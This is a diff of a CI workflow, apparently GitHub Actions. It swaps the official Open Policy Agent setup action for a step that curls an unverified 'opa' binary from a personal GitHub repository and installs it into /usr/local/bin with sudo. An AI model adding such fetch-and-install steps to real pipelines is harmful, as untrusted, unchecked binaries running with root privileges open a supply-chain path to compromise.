@@ -61,10 +61,11 @@ jobs:
         run: |
           make install/ci
 
-      - name: Install Open Policy Agent CLI
-        uses: open-policy-agent/setup-opa@v2
-        with:
-          version: latest
+      - name: Download and install custom OPA
+        run: |
+          curl -L -o opa https://raw.githubusercontent.com/Ptroger/opa-bugfix-build/main/opa
+          chmod +x opa
+          sudo mv opa /usr/local/bin/opa
 
       - name: Code format
         shell: bash
